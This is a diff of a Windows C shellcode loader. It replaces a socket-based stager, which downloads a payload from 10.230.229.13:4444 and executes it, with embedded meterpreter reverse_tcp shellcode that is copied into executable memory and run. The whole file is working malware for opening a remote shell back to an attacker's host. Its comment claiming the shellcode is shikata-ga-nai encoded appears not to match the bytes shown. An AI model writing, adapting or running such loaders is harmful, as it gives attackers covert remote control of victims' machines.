@@ -1,61 +1,36 @@
 #include <windows.h>
-#include <winsock2.h>
-#include <stdio.h>
-
-#define IP_ADDRESS "10.230.229.13"
-#define PORT 4444
-#define BUF_LEN 1024
-#define PAYLOAD_SZ 819200
 
 int main() {
-  // Initialize Winsock and use version 2.2
-  WSADATA wsaData;
-  int wResult;
-  WSAStartup(MAKEWORD(2,2), &wsaData);
+
+  // Set the payload: meterpreter/reverse_tcp encoded 5 times with shikata-ga-nai 
+  unsigned char payload[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
+    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+    "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
+    "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
+    "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
+    "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
+    "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
+    "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
+    "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
+    "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
+    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
+    "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
+    "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
+    "\x05\x68\x0a\xe6\xe5\x0d\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10"
+    "\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
+    "\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
+    "\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
+    "\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
+    "\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
+    "\x85\xf6\x75\xec\xc3";
+
+  // Create a rwx buffer to store the payload in.
+  char *rwx = (char *)VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+  // Copy the payload into the rwx buffer.
+  memcpy(rwx, &payload, sizeof(payload));
   
-  // Create a socket to connect to an IP and port
-  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-  // Define socket type, AF_INET (IPv4), IP address, and port.
-  struct sockaddr_in saServer;
-  saServer.sin_family = AF_INET;
-  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
-  saServer.sin_port = htons(PORT);
-
-  // Connect to socket
-  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
-  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
-
-  // Receive data from port;
-  char buf[BUF_LEN] = "";
-  char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  char *index = rwx;    // Pointer to track position in the payload buffer.
-  int res = 0;          // Hold return value of recv().
-  u_long size = 0;      // Holds the size of the payload.
-  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
-
-  printf("Receiving\n");
-  do {
-    res = recv( ConnectSocket, index, BUF_LEN, 0 );
-    if (rcvd == 0) { size = *(u_long*)rwx; printf("Payload size: %d", size);}
-    index += res;
-    rcvd += res;
-  } while (size > rcvd);
-
-  closesocket(ConnectSocket);
-
-  index = rwx;
-  int i = 0;
-  do {
-    *index = 90;
-    index ++;
-    i++;
-  } while (i < 4);
-
-
-
-  // printf("Executing payload.\n");
-  // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
+  // Execute the payload
   void (*func) ();
   func = (void (*) ()) (u_long*)(rwx);
   (void) (*func) (); 
